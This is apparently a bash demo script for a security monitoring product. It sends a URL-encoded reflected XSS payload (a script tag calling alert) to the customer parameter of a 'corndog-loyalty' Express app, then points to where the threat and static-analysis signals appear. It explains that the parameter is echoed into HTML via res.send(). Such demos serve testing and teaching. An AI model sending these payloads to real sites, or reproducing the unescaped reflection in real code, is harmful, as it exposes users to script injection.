#!/usr/bin/env bash
# Demo: Reflected XSS via loyalty card customer parameter
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/_common.sh"

banner "Reflected XSS" \
       "corndog-loyalty (Express / Node.js)" \
       "ASM Threat Detection + Static Analysis"

run_curl "Requesting loyalty card with XSS payload in customer parameter" \
  "${BASE_URL}/api/loyalty/card?customer=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E"

echo -e "${YLW}  Tip: Open the URL in a browser to see the reflected XSS payload render.${RST}"
echo ""

dd_signal \
  "Security > Application Security > Signals — ASM XSS threat event" \
  "Security > Code Security > Static Analysis — typescript-express/xss-vulnerability" \
  "The customer parameter is reflected directly into HTML via res.send()"
